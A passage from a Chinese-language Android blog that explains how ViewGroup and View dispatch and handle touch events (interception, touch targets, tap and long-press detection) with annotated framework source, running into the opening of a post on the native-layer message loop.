onInterceptTouchEvent(ev); ev.setAction(action); // 恢复action状态以避免其在上一行中被改变 &#125; else &#123; // 不拦截（不允许） intercepted = false; &#125; &#125; else &#123; // 如果不是一个新触摸动作的开始（不是down），并且没有处理该消息的目标（mFirstTouchTarget为null），说明当前view应该负责处理该事件，则当前view应该继续拦截并处理这个事件 intercepted = true; &#125; // 如果被当前view拦截，或者已经有处理该事件的目标，则去除辅助功能标志，进行普通的事件分发 if (intercepted || mFirstTouchTarget != null) &#123; ev.setTargetAccessibilityFocus(false); &#125; 这一段就是检测该view是否应该被拦截，虽然没有看下面的代码，我们可以猜测如果intercepted标志为true，那么这个事件就会留在该view被处理而不会再向其子view分发。下面是\b\u001bViewGroup默认的处理\b方式： onInterceptTouchEvent()\b123456789public boolean onInterceptTouchEvent(MotionEvent ev) &#123; if (ev.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; ev.getAction() == MotionEvent.ACTION_DOWN &amp;&amp; ev.isButtonPressed(MotionEvent.BUTTON_PRIMARY) &amp;&amp; isOnScrollbarThumb(ev.getX(), ev.getY())) &#123; return true; &#125; return false;&#125; 这个方法默认只是对一个特殊情况作了特殊的拦截处理。\b dispatchTouchEvent(ViewGroup)继续向下： 1234567891011121314151617181920212223242526272829303132333435// 检查是否为取消事件final boolean canceled = resetCancelNextUpFlag(this) || actionMasked == MotionEvent.ACTION_CANCEL;// 分离触摸事件标志，如果是多点触摸，分别分发给多个view final boolean split = (mGroupFlags &amp; FLAG_SPLIT_MOTION_EVENTS) != 0; TouchTarget newTouchTarget = null; boolean alreadyDispatchedToNewTouchTarget = false;// 如果未被取消并且没有被当前view拦截，应该\b进行向下分发 if (!canceled &amp;&amp; !intercepted) &#123; // 如果是辅助功能事件，我们调用findChildWithAccessibilityFocus()来找到接收该事件的目标view View childWithAccessibilityFocus = ev.isTargetAccessibilityFocus() ? findChildWithAccessibilityFocus() : null; // 如果是一个按下事件（初始事件） if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; final int actionIndex = ev.getActionIndex(); // 按下事件为0 // 获取触摸点对应的PointerId，一个id表示一个触摸点，如果不分离，则获取全部的id final int idBitsToAssign = split ? 1 &lt;&lt; ev.getPointerId(actionIndex) : TouchTarget.ALL_POINTER_IDS; // 清除之前的id信息 removePointersFromTouchTargets(idBitsToAssign); final int childrenCount = mChildrenCount; if (newTouchTarget == null &amp;&amp; childrenCount != 0) &#123; final float x = ev.getX(actionIndex); final float y = ev.getY(actionIndex); // 创建待遍历的view列表，调用了buildTouchDispatchChildList()方法（见下文） final ArrayList&lt;View&gt; preorderedList = buildTouchDispatchChildList(); // 是否采用自定义view顺序（这个顺序将决定哪个view会先接收到事件） final boolean customOrder = preorderedList == null &amp;&amp; isChildrenDrawingOrderEnabled(); final View[] children = mChildren; 这段主要为后面的查找目标view作准备，我们先建立了preorderedList列表，我们来看看这个列表的顺序是如何构建的： 构建待遍历的view数组123public ArrayList&lt;View&gt; buildTouchDispatchChildList() &#123; return buildOrderedChildList();&#125; 1234567891011121314151617181920212223242526272829ArrayList&lt;View&gt; buildOrderedChildList() &#123; final int childrenCount = mChildrenCount; // 如果子view数小于等于1，或没有子view有z轴，直接返回null if (childrenCount &lt;= 1 || !hasChildWithZ()) return null; if (mPreSortedChildren == null) &#123; mPreSortedChildren = new ArrayList&lt;&gt;(childrenCount); &#125; else &#123; mPreSortedChildren.clear(); mPreSortedChildren.ensureCapacity(childrenCount); &#125; // 如果自定义绘制顺序，则应使用自定义分发顺序 final boolean customOrder = isChildrenDrawingOrderEnabled(); for (int i = 0; i &lt; childrenCount; i++) &#123; // 获取正确的子view索引（不为自定义顺序时为i，自定义顺序时为自定义顺序对应的索引 final int childIndex = getAndVerifyPreorderedIndex(childrenCount, i, customOrder); final View nextChild = mChildren[childIndex]; // 保存z值 final float currentZ = nextChild.getZ(); // 如果列表中最后一个view的z值大于待插入的view，将当前view插入其之前，保证在后面从后向前遍历view时可以保存在屏幕最上面的view可以先接收到触摸事件 int insertIndex = i; while (insertIndex &gt; 0 &amp;&amp; mPreSortedChildren.get(insertIndex - 1).getZ() &gt; currentZ) &#123; insertIndex--; &#125; mPreSortedChildren.add(insertIndex, nextChild); &#125; return mPreSortedChildren;&#125; 总的来说，就是如果有自定义绘制顺序，那么按自定义绘制顺序，否则按默认绘制顺序，然后如果view定义了z值属性，那么在屏幕最上层的view应该先接收到触摸事件。 dispatchTouchEvent(ViewGroup)回到分发方法，继续向下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859 for (int i = childrenCount - 1; i &gt;= 0; i--) &#123; // 从preorderList中获取到正确的索引与子view final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); // 如果需要处理辅助功能事件（找到了目标子view） if (childWithAccessibilityFocus != null) &#123; // 保证该子view最先接收到事件 if (childWithAccessibilityFocus != child) &#123; continue; &#125; // 找到该子view后清除目标的记录 childWithAccessibilityFocus = null; // 如果该子view没有处理辅助功能事件，那么应该重新遍历view进行普通分发，故将i重置 i = childrenCount - 1; &#125; // 两个方法分别检查子view是否能接收触摸事件 与 触摸事件在该view的范围内，如果都成立，说明找到了应该处理该事件的子view if (!canViewReceivePointerEvents(child) || !isTransformedTouchPointInView(x, y, child, null)) &#123; ev.setTargetAccessibilityFocus(false); continue; &#125; // 找到了目标子view，检查touchTarget链表中是否已经存在这个view newTouchTarget = getTouchTarget(child); if (newTouchTarget != null) &#123; // 链表中已经存在该view，说明该子view已经接收过按下（初始）的触摸事件，说明这是一个多点触摸的情况，把新的点加入touchTarget并退出子view遍历 newTouchTarget.pointerIdBits |= idBitsToAssign; break; &#125; resetCancelNextUpFlag(child); // 在dispatchTransformedTouchEvent()方法中进行下一层的事件分发，如果该方法返回true，说明事件被后续的view处理了 if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) &#123; // 保存mLastTouchDownTime、mLastTouchDownIndex、mLastTouchDownX、mLastTouchDownY mLastTouchDownTime = ev.getDownTime(); if (preorderedList != null) &#123; for (int j = 0; j &lt; childrenCount; j++) &#123; if (children[childIndex] == mChildren[j]) &#123; mLastTouchDownIndex = j; break; &#125; &#125; &#125; else &#123; mLastTouchDownIndex = childIndex; &#125; mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); // 保存该view到touchTarget链表 newTouchTarget = addTouchTarget(child, idBitsToAssign);alreadyDispatchedToNewTouchTarget = true; break; // 退出对\b\b子view的遍历，一个事件只会被分发给一个子view &#125; ev.setTargetAccessibilityFocus(false); &#125; // 这里是遍历view循环结束点 // 清除preorderedList，避免view泄露 if (preorderedList != null) preorderedList.clear(); &#125; // 这里if (newTouchTarget == null &amp;&amp; childrenCount != 0) 判断结束点 首先明确一点，这段代码整个都是在 123if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; 这个条件下的，也就是说这是一个down事件，标志着一个新触摸动作的开始（一个触摸动作一般是down-&gt;move-&gt;up这样的顺序）。 我们在这段代码中找到了目标view，然后进一步调用dispatchTransformedTouchEvent()方法继续向下分发，如果该方法返回true，那么说明下面的子view处理了该事件，所以我们将该view保存到touchTarget链表中，然后保存了一些用于后续判断的事件信息。来看几个这段代码中调用的方法： canViewReceivePointerEvents()1234private static boolean canViewReceivePointerEvents(@NonNull View child) &#123; return (child.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || child.getAnimation() != null;&#125; 检查是否可见，或存在动画。 isTransformedTouchPointInView()1234567891011protected boolean isTransformedTouchPointInView(float x, float y, View child, PointF outLocalPoint) &#123; final float[] point = getTempPoint(); point[0] = x; point[1] = y; transformPointToViewLocal(point, child); final boolean isInView = child.pointInView(point[0], point[1]); if (isInView &amp;&amp; outLocalPoint != null) &#123; outLocalPoint.set(point[0], point[1]); &#125; return isInView;&#125; 12345678public void transformPointToViewLocal(float[] point, View child) &#123; point[0] += mScrollX - child.mLeft; point[1] += mScrollY - child.mTop; if (!child.hasIdentityMatrix()) &#123; child.getInverseMatrix().mapPoints(point); &#125;&#125; 将点值从屏幕坐标系转换到view的坐标系，然后检查是否在view的区域内。 dispatchTransformedTouchEvent()12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970private boolean dispatchTransformedTouchEvent(MotionEvent event, boolean cancel, View child, int desiredPointerIdBits) &#123;final boolean handled;// 保存原始action，便于从调用改变`event`状态后恢复final int oldAction = event.getAction();// 取消事件的情况比较特殊，我们不用做任何过滤或转换if (cancel || oldAction == MotionEvent.ACTION_CANCEL) &#123; event.setAction(MotionEvent.ACTION_CANCEL); // 如果没有子view作为分发目标，则调用super（View类）的分发方法 if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; // 向子view进一步分发 handled = child.dispatchTouchEvent(event); &#125; // 恢复event状态 event.setAction(oldAction); return handled;&#125;// 过滤出需要的触摸点idfinal int oldPointerIdBits = event.getPointerIdBits();final int newPointerIdBits = oldPointerIdBits &amp; desiredPointerIdBits;if (newPointerIdBits == 0) &#123; return false;&#125;final MotionEvent transformedEvent;// 如果所有触摸点都被使用，我们可以直接使用原event，如果不是，我们需要从中分离出一个新的transformedEvent副本再进行分发，这么做的是因为我们要保持原event的状态if (newPointerIdBits == oldPointerIdBits) &#123; if (child == null || child.hasIdentityMatrix()) &#123; if (child == null) &#123; handled = super.dispatchTouchEvent(event); &#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; // 计算并设置view偏移给event event.offsetLocation(offsetX, offsetY); // 分发事件 handled = child.dispatchTouchEvent(event); // 恢复event原状态 event.offsetLocation(-offsetX, -offsetY); &#125; return handled; &#125; // 复制一个event transformedEvent = MotionEvent.obtain(event);&#125; else &#123; // 分离出的新的transformedEvent transformedEvent = event.split(newPointerIdBits);&#125;if (child == null) &#123; handled = super.dispatchTouchEvent(transformedEvent);&#125; else &#123; final float offsetX = mScrollX - child.mLeft; final float offsetY = mScrollY - child.mTop; transformedEvent.offsetLocation(offsetX, offsetY); if (! child.hasIdentityMatrix()) &#123; transformedEvent.transform(child.getInverseMatrix()); &#125; handled = child.dispatchTouchEvent(transformedEvent);&#125;// 回收临时拷贝transformedEvent.recycle();return handled;&#125; 这个方法中对触摸事件设置好正确的偏移后向目标子view进行分发，如果没有目标，则调用自身的父类，也就是view的分发方法进行处理。 addTouchTarget()123456private TouchTarget addTouchTarget(@NonNull View child, int pointerIdBits) &#123; final TouchTarget target = TouchTarget.obtain(child, pointerIdBits); target.next = mFirstTouchTarget; mFirstTouchTarget = target; return target;&#125; 这里mFirstTouchTartget是链表头，新增的touchTarget被插入了表头位置。 dispatchTouchEvent(ViewGroup)再回到这个主要方法中： 123456789101112// 没找到可以接收事件的子view if (newTouchTarget == null &amp;&amp; mFirstTouchTarget != null) &#123; // mFirstTouchTarget为链表头 newTouchTarget = mFirstTouchTarget; // 把newTouchTarget指向表尾 while (newTouchTarget.next != null) &#123; newTouchTarget = newTouchTarget.next; &#125; newTouchTarget.pointerIdBits |= idBitsToAssign; &#125; &#125; &#125; 注意11、12行的两个右括号分别对应退出的是 1if (!canceled &amp;&amp; !intercepted) &#123; 与 123if (actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123; 这意味着我们已经处理完了没有被取消、当前ViewGroup拦截，并且为初始触摸事件(Down) 的情况的分发，但是要注意的是现在并没有退出函数，还要继续向下执行： 123456789101112131415161718192021222324252627282930313233343536373839 if (mFirstTouchTarget == null) &#123; // 意味着还没有子view处理该触摸事件 // 此时第三个参数为null，会向父亲View传递令其处理这个事件 handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); &#125; else &#123; // 说明已有\b子view处理过该事件\b序列(由`down`开始)，直接将事件分发给该view，当\b需要时取消事件 TouchTarget predecessor = null; TouchTarget target = mFirstTouchTarget; while (target != null) &#123; final TouchTarget next = target.next; if (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) &#123; // 该TouchTarget已经在前面的情况中被分发处理了，\b避免\b重复处理 handled = true; &#125; else &#123;// 如果被当前ViewGroup拦截，向下分发cancel事件 final boolean cancelChild = resetCancelNextUpFlag(target.child) || intercepted; // dispatchTransformedTouchEvent()方法成功向下分发取消事件或分发正常事件 if (dispatchTransformedTouchEvent(ev, cancelChild, target.child, target.pointerIdBits)) &#123; handled = true; &#125; // 如果\b发送了取消事件，则\b移除分发记录（链表移动操作） if (cancelChild) &#123; if (predecessor == null) &#123; mFirstTouchTarget = next; &#125; else &#123; predecessor.next = next; &#125; target.recycle(); target = next; continue; &#125; &#125; predecessor = target; target = next; &#125; &#125; 123456789101112131415161718 if (canceled || actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_HOVER_MOVE) &#123;// 如果为up事件或者hover_move事件（一系列触摸事件结束），清除记录的信息 resetTouchState(); &#125; else if (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_UP) &#123; // 清除保存触摸信息 final int actionIndex = ev.getActionIndex(); final int idBitsToRemove = 1 &lt;&lt; ev.getPointerId(actionIndex); removePointersFromTouchTargets(idBitsToRemove); &#125; &#125; if (!handled &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(ev, 1); &#125; // 返回事件是否被处理的信息 return handled; dispatchTouchEvent(ViewGroup)小结现在我们再从头梳理一遍这个比较长的方法过程： 关键点： TouchTarget链表保存了处理了初始触摸事件的子View，注意只有一系列触摸动作的初始事件（Down事件）才会找到对应的子View并生成TouchTarget的一个节点。后面的系列事件都会分发给TouchTarget链表中保存的子View，这也就意味着，如果一个子View没有处理初始的Down事件，那么它也就不会再接收到后面的move up等事件。 如果onInterceptTouchEvent()返回true，当前ViewGroup拦截了该事件，那么该事件不会再向下面分发，并且会向TouchTarget中保存的所有子View发送cancel事件提醒它们这一系列的事件已经因被拦截而取消了，同时还会\b移除\b\b分发记录，意味着后面的\b事件也不再会分发到子View。 如果是辅助功能的事件，那么会优先分发给支持辅助功能的View，如果不存在这样的view，则进行一般的事件分发。 顺序（大致）： 判断是否被拦截 如果未被拦截且为初始事件，找到可以处理事件的子View（在点击范围内且可被点击），分发事件后如果该子View处理了事件（dispatchTouchEvent()方法返回true）则存入TouchTarget链表并停止子View的遍历（后面的子View就没有机会再收到事件），如果该子View没有处理该事件，则继续遍历寻找 如果事件被拦截，向TouchTarget中的子View发送cancel事件 将未被2、3情况处理的事件分发给TouchTarget中的子View，如果TouchTarget为空，则交给ViewGroup本身父View的dispatchTouchEvent()方法处理 dispatchTouchEvent(View)现在我们知道，当一个触摸事件分发到一个非ViewGroup的View或者ViewGroup不再向下分发该事件（没有处理事件的目标或者被本身拦截），那么View类的dispatchTouchEvent()将会被调用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public boolean dispatchTouchEvent(MotionEvent event) &#123; // 处理辅助功能事件的情况 if (event.isTargetAccessibilityFocus()) &#123; if (!isAccessibilityFocusedViewOrHost()) &#123; return false; &#125; event.setTargetAccessibilityFocus(false); &#125; boolean result = false; // 一致性检验，检查事件是否被改变 if (mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onTouchEvent(event, 0); &#125; final int actionMasked = event.getActionMasked(); if (actionMasked == MotionEvent.ACTION_DOWN) &#123; // 停止滚动（如果在） stopNestedScroll(); &#125; if (onFilterTouchEventForSecurity(event)) &#123; if ((mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; handleScrollBarDragging(event)) &#123; // 如果事件为鼠标拖动滚动条 result = true; &#125; ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnTouchListener != null &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; li.mOnTouchListener.onTouch(this, event)) &#123; // 如果注册了点击事件监听(onTouchListener)，并且当前view处于启动状态，并且调用注册的onTouch方法返回了true，说明事件被消耗，标记结果为true，（注意这个时候已经调用了`onTouch()`进行事件分发处理 result = true; &#125; // 如果没有被注册的onTouch方法消耗事件，那么调用View本身的onTouch方法，如果返回了true，说明事件被消耗，标记结果为true if (!result &amp;&amp; onTouchEvent(event)) &#123; result = true; &#125; &#125; // 一致性检验，检查事件是否被改变 if (!result &amp;&amp; mInputEventConsistencyVerifier != null) &#123; mInputEventConsistencyVerifier.onUnhandledEvent(event, 0); &#125; // 如果是up事件（系列触摸动作的终点），或者是cancel事件，或者是初始事件并且我们没对它进行处理（回忆前面的内容，如果没有处理down事件，那么也不会收到后面的事件），就停止滚动状态 if (actionMasked == MotionEvent.ACTION_UP || actionMasked == MotionEvent.ACTION_CANCEL || (actionMasked == MotionEvent.ACTION_DOWN &amp;&amp; !result)) &#123; stopNestedScroll(); &#125; return result;&#125; 我们可以看到，View的onDispatchTouchEvent()方法主要是先检查是否注册了onTouchListener，如果注册了监听并且调用返回了true消耗了该事件，那么说明该View处理了该事件，也会收到后续的事件，如果没有注册监听或者没有消耗，就调用View本身的onTouchEvent方法，如果返回true则消耗事件。 下面来看View默认的onTouchEvent()方法： onTouchEvent()这个方法我们也拆开来看： 12345678910111213141516171819202122public boolean onTouchEvent(MotionEvent event) &#123; final float x = event.getX(); final float y = event.getY(); final int viewFlags = mViewFlags; final int action = event.getAction(); if ((viewFlags &amp; ENABLED_MASK) == DISABLED) &#123; if (action == MotionEvent.ACTION_UP &amp;&amp; (mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; // 如果view被禁用且按下状态为true，取消接下状态 setPressed(false); &#125; // 如果该view被禁用，但是被设置为clickable或longClickable或contextClickable，仍然消耗该事件 return (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE); &#125; // 如果为该view设置了触摸事件代理，则转发到代理处理触摸事件 if (mTouchDelegate != null) &#123; if (mTouchDelegate.onTouchEvent(event)) &#123; return true; &#125; &#125; 处理了view被禁用和设置了触摸事件代理的情况。 1234if (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) || (viewFlags &amp; CONTEXT_CLICKABLE) == CONTEXT_CLICKABLE) &#123; switch (action) &#123; 注意下面的语句都是在该view可被点击的情况下执行的，并且一旦该判断成立，那么最终一定会返回true，也就是说，设置了可被点击的view在默认情况下一定会消耗触摸事件。 下面对不同的触摸事件类型分别作出处理，为了分析方便，我调换了各case的顺序： case MotionEvent.ACTION_DOWN:一个触摸动作的开始 12345678910111213141516171819202122232425mHasPerformedLongPress = false;// 检查Button点击事件的特殊情况（下文讲）if (performButtonActionOnTouchDown(event)) &#123; break;&#125;// 向上遍历view以检查是否处在一个可滚动的容器中boolean isInScrollingContainer = isInScrollingContainer();// 如果是在滚动容器中，稍延迟触摸反馈来应对这是一个滚动操作的情况if (isInScrollingContainer) &#123; mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) &#123; // 新建一个对象用于检测单击事件（下文讲） mPendingCheckForTap = new CheckForTap(); &#125; mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); // 利用消息队列来延迟发送检测单击事件的方法，延迟时间为getTapTimeout设置的超时（下文讲） postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());&#125; else &#123; // 没有在滚动容器中，马上显示触摸反馈，并且开始检查长按事件（下文讲） setPressed(true, x, y); checkForLongClick(0, x, y);&#125;break; performButtonActionOnTouchDown()123456789protected boolean performButtonActionOnTouchDown(MotionEvent event) &#123; if (event.isFromSource(InputDevice.SOURCE_MOUSE) &amp;&amp; (event.getButtonState() &amp; MotionEvent.BUTTON_SECONDARY) != 0) &#123; showContextMenu(event.getX(), event.getY()); mPrivateFlags |= PFLAG_CANCEL_NEXT_UP_EVENT; return true; &#125; return false;&#125; 只是处理了事件来源是鼠标的特殊情况。 CheckForTap()它是一个Runnable，用于延迟执行单击检测的任务： 1234567891011private final class CheckForTap implements Runnable &#123; public float x; public float y; @Override public void run() &#123; mPrivateFlags &amp;= ~PFLAG_PREPRESSED; setPressed(true, x, y); checkForLongClick(ViewConfiguration.getTapTimeout(), x, y); &#125;&#125; 它被放到消息队列，在设置的超时之后被执行，如果这段时间它没有被移出队列，那么说明这就是一个单击事件，那么就显示触摸反馈并开始长按检测。 postDelayed()123456789public boolean postDelayed(Runnable action, long delayMillis) &#123; final AttachInfo attachInfo = mAttachInfo; if (attachInfo != null) &#123; return attachInfo.mHandler.postDelayed(action, delayMillis); &#125; getRunQueue().postDelayed(action, delayMillis); return true;&#125; 往注册的Handler的消息队列或者他自己实现的一个消息队列中发送需要被延时执行的消息，这块就不深入探究了，消息机制分析的文章已经讲得很清楚了。 checkForLongClick()1234567891011if ((mViewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE) &#123; mHasPerformedLongPress = false; if (mPendingCheckForLongPress == null) &#123; mPendingCheckForLongPress = new CheckForLongPress(); &#125; mPendingCheckForLongPress.setAnchor(x, y); mPendingCheckForLongPress.rememberWindowAttachCount(); postDelayed(mPendingCheckForLongPress, ViewConfiguration.getLongPressTimeout() - delayOffset);&#125; 同样是利用postDelayed()方法来检测是否到达了检测时间， 123456789101112131415161718192021222324private final class CheckForLongPress implements Runnable &#123; private int mOriginalWindowAttachCount; private float mX; private float mY; @Override public void run() &#123; if (isPressed() &amp;&amp; (mParent != null) &amp;&amp; mOriginalWindowAttachCount == mWindowAttachCount) &#123; if (performLongClick(mX, mY)) &#123; mHasPerformedLongPress = true; &#125; &#125; &#125; public void setAnchor(float x, float y) &#123; mX = x; mY = y; &#125; public void rememberWindowAttachCount() &#123; mOriginalWindowAttachCount = mWindowAttachCount; &#125;&#125; 如果run()方法被执行，说明到达了设定的时间并且没有因为触摸点移动或者抬起而移除该Runnable信息，为一个长按动作，执行performLongClick()方法来触发长按回调： 12345678public boolean performLongClick(float x, float y) &#123; mLongClickX = x; mLongClickY = y; final boolean handled = performLongClick(); mLongClickX = Float.NaN; mLongClickY = Float.NaN; return handled;&#125; 123public boolean performLongClick() &#123; return performLongClickInternal(mLongClickX, mLongClickY);&#125; 1234567891011121314151617private boolean performLongClickInternal(float x, float y) &#123; sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_LONG_CLICKED); boolean handled = false; final ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnLongClickListener != null) &#123; handled = li.mOnLongClickListener.onLongClick(View.this); &#125; if (!handled) &#123; final boolean isAnchored = !Float.isNaN(x) &amp;&amp; !Float.isNaN(y); handled = isAnchored ? showContextMenu(x, y) : showContextMenu(); &#125; if (handled) &#123; performHapticFeedback(HapticFeedbackConstants.LONG_PRESS); &#125; return handled;&#125; 第5-8行是与之前onTouchEvent()方法中类似的关于是否注册了监听器的判断，如果注册了监听器，那么优先使用监听器的onLongClick()方法来处理长近事件，如果没有监听器成功处理事件，那么会先判断长按是否有锚点，再根据锚点的存在性调用showContextMenu()显示可能存在的上下文菜单。 13行判断如果当前方法成功消耗了长按事件，调用performHapticFeedback()方法显示一个触觉的反馈。 case MotionEvent.ACTION_MOVE:触摸点发生了移动 1234567891011drawableHotspotChanged(x, y);if (!pointInView(x, y, mTouchSlop)) &#123; removeTapCallback(); if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; removeLongPressCallback(); setPressed(false); &#125;&#125;break; 第1行调用了drawableHotspotChanged()通知可能存在的子View或drawable触摸点发生了移动。 第3行检测由于移动，触摸点是否移出了view+slop扩展出的范围，slop的存在是为了保证在按下后轻微移出点击区域的情况下能正常判断点击： 1234public boolean pointInView(float localX, float localY, float slop) &#123; return localX &gt;= -slop &amp;&amp; localY &gt;= -slop &amp;&amp; localX &lt; ((mRight - mLeft) + slop) &amp;&amp; localY &lt; ((mBottom - mTop) + slop);&#125; 如果移出了这个范围，首先第4行调用removeTapCall()： 123456private void removeTapCallback() &#123; if (mPendingCheckForTap != null) &#123; mPrivateFlags &amp;= ~PFLAG_PREPRESSED; removeCallbacks(mPendingCheckForTap); &#125;&#125; 先取消了预按下状态的flag，再调用removeCallbacks： 123456789101112public boolean removeCallbacks(Runnable action) &#123; if (action != null) &#123; final AttachInfo attachInfo = mAttachInfo; if (attachInfo != null) &#123; attachInfo.mHandler.removeCallbacks(action); attachInfo.mViewRootImpl.mChoreographer.removeCallbacks( Choreographer.CALLBACK_ANIMATION, action, null); &#125; getRunQueue().removeCallbacks(action); &#125; return true;&#125; 从消息队列中移出我们检测单击事件的消息，这样，由于触摸点移动出了当前view，如果在滚动容器中的情况下，长按的检测就不会进行（因mPendingCheckForTap消息被移出消息队列）。 12345if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) &#123; removeLongPressCallback(); setPressed(false);&#125; 如果pressed标志位为1，那么就取消消息队列中长按触发消息，同时去除pressed标志位。 总结一下，只要触摸点移动出了当前view，那么所有的点击、长按事件都不会触发，但是只要移动还在view+slot范围内，那么点击长按事件还是会被触发的。 case MotionEvent.ACTION_UP:抬起手指 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849boolean prepressed = (mPrivateFlags &amp; PFLAG_PREPRESSED) != 0;if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0 || prepressed) &#123; // 如果有prepressed或pressed标志 boolean focusTaken = false; if (isFocusable() &amp;&amp; isFocusableInTouchMode() &amp;&amp; !isFocused()) &#123; // 可以获得焦点但没有获得 // 请求获取焦点 focusTaken = requestFocus(); &#125; if (prepressed) &#123; // prepressed状态表示滚动容器中的点击检测还没有被消息队列执行，这个时候如果抬起手指说明是一个点击事件，调用setPressed显示反馈 setPressed(true, x, y); &#125; if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) &#123; // 没有到达执行长按触发消息的时间就抬起了手指，说明这是一个单击事件，移除长按触发消息 removeLongPressCallback(); if (!focusTaken) &#123; // 当当前view没有获取焦点时才能触发点击事件，说明一个可以获取焦点的view是无法触发点击事件的 if (mPerformClick == null) &#123; mPerformClick = new PerformClick(); &#125; // 使用post来将performClick动作放入队列中执行来保证其他view视觉上的变化可以在点击事件被触发之前被看到 if (!post(mPerformClick)) &#123; // 如果post没有成功，则直接执行 performClick(); &#125; &#125; &#125; // UnsetPressedState为Runnable消息，用于取消view的prepressed或pressed状态 if (mUnsetPressedState == null) &#123; mUnsetPressedState = new UnsetPressedState(); &#125; if (prepressed) &#123; // 取消prepressed状态 postDelayed(mUnsetPressedState, ViewConfiguration.getPressedStateDuration()); &#125; else if (!post(mUnsetPressedState)) &#123; // 取消pressed状态 mUnsetPressedState.run(); &#125; // 清除单击检测消息 removeTapCallback();&#125;mIgnoreNextUpEvent = false;break; 可以看到up时，才是单击事件真正触发的地方，如果这个view可以获得焦点，那么会优先处理焦点获取，而不会触发点击事件。 1234567891011121314public boolean performClick() &#123; final boolean result; final ListenerInfo li = mListenerInfo; if (li != null &amp;&amp; li.mOnClickListener != null) &#123; playSoundEffect(SoundEffectConstants.CLICK); li.mOnClickListener.onClick(this); result = true; &#125; else &#123; result = false; &#125; sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_CLICKED); return result;&#125; 相似的方法，检测了是否有监听的存在并执行，最后给辅助功能选项发送一条消息。 case MotionEvent.ACTION_CANCEL:取消这一系列触摸动作 12345678case MotionEvent.ACTION_CANCEL:setPressed(false);removeTapCallback();removeLongPressCallback();mInContextButtonPress = false;mHasPerformedLongPress = false;mIgnoreNextUpEvent = false;break; 清除所有的状态。 小结View默认的onTouchEvent()方法处理了一系列的触摸事件， 判断是否触发单击、长按等，并且提供了默认的按下、点击、长按的视觉反馈。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"Android 消息机制（三）Native层消息机制","date":"2017-11-02T07:57:53.000Z","path":"2017/11/02/android_event_3/","text":"之前的两篇文章讲解了java层消息机制的过程以及使用，中间省略了比较多的代码就是在native层实现的消息机制中使用的。这篇文章就对这一部分进行讲解。 起点我们从第一篇文章知道，Looper.loop()方法被调用后，会启动一个无限循环，而在这个循环中，调用了MessageQueue的next()方法以获取下一条消息，而next()方法中会首先调用nativePollOnce()方法，这个方法的作用在之前说过是阻塞，达到超时时间或有新的消息到达时得到eventFd的通知再唤醒消息队列，其实这个方法也是native消息处理的开始。 进入Native层android_os_MessageQueue_nativePollOnce()12345static void android_os_MessageQueue_nativePollOnce(JNIEnv* env, jobject obj, jlong ptr, jint timeoutMillis) &#123; NativeMessageQueue* nativeMessageQueue = reinterpret_cast&lt;NativeMessageQueue*&gt;(ptr); nativeMessageQueue-&gt;pollOnce(env, obj, timeoutMillis);&#125; 12345678void NativeMessageQueue::pollOnce(JNIEnv* env, jobject pollObj, int timeoutMillis) &#123; mPollEnv = env; mPollObj = pollObj; mLooper-&gt;pollOnce(timeoutMillis); mPollObj = NULL; mPollEnv = NULL; ...&#125; 调用了Native Looper的pollOnce()方法： pollOnce()123inline int pollOnce(int timeoutMillis) &#123; return pollOnce(timeoutMillis, NULL, NULL, NULL);&#125; 12345678910111213141516171819202122232425262728int Looper::pollOnce(int timeoutMillis, int* outFd, int* outEvents, void** outData) &#123; int result = 0; for (;;) &#123; while (mResponseIndex &lt; mResponses.size()) 